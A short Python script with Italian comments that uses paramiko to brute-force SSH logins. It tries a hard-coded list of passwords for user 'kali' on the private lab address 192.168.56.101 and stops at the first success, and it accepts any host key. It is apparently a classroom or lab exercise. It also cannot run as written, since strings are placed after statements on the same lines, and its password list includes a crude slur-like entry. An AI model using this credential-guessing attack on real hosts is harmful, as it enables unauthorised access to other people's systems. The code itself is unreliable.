
""" Codice per provare ad autenticarsi a un client SSH """

import paramiko  """ Importazione della libreria per per aprire connessioni SSH """

def test_authentication(username, hostname, password):  """ Creo client SSH """
    client = paramiko.SSHClient() 
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) """ Accetta le chiavi degli Host """

    try:
        client.connect(hostname, username=username, password=password) """ Tenta la connessione usando Username e password """
        print(f"Authentication successful: {username}:{password}")
        return True  """ se il tentativo va a buon fine risponde True """
    
    except paramiko.AuthenticationException: """ se le credenziali sono errate viene stamapato un messaggio False """
        print(f"Authentication failed: {username}:{password}")
        return False
    
    finally:
        client.close() """ La connessione viene chiusa """ 


passwords = ["password", "secret", "lolz.gay", "kali", "ciao", "sono", "valerio"] """ Password con le quali viene tentata la connessione  """
for p in passwords:
    if test_authentication("kali", "192.168.56.101", p): """ ogni pass ha come credenziali User Kali e host 192.168.56.101 """
        break




